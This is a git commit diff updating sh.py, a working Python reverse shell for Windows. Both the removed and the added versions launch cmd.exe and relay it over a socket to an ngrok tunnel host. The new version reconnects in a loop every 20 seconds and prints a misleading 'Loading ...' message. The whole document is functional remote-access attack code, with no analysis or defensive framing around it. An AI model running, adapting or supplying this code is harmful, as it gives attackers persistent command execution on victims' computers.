2577f87ced29dd678f06c364d9e9c1324ff63004
Omar Samy <osamy7592@gmail.com>
2024-05-04 02:27:54 +0300

    Update sh.py

--- sh.py
+++ sh.py
@@ -1,6 +1,42 @@
-import socket,os,threading,subprocess as sp
-p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
-s=socket.socket()
-s.connect(('6.tcp.eu.ngrok.io',15328))
-threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
-threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
+import socket
+import os
+import threading
+import subprocess as sp
+import time
+
+def rev():
+   p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
+   s = socket.socket()
+   s.connect(('4.tcp.eu.ngrok.io', 19814))
+
+   def s_o():
+       while True:
+           try:
+               output = os.read(p.stdout.fileno(), 1024)
+               if not output:
+                   break
+               s.sendall(output)
+           except Exception as e:
+               print("Error sending output:", e)
+               break
+
+   def r_i():
+       while True:
+           try:
+               data = s.recv(1024)
+               if not data:
+                   break
+               p.stdin.write(data)
+               p.stdin.flush()
+           except Exception as e:
+               print("Error receiving input:", e)
+               break
+
+   threading.Thread(target=s_o, daemon=True).start()
+   threading.Thread(target=r_i, daemon=True).start()
+
+   time.sleep(20)
+
+while True:
+   rev()
+   print("Loading ...")
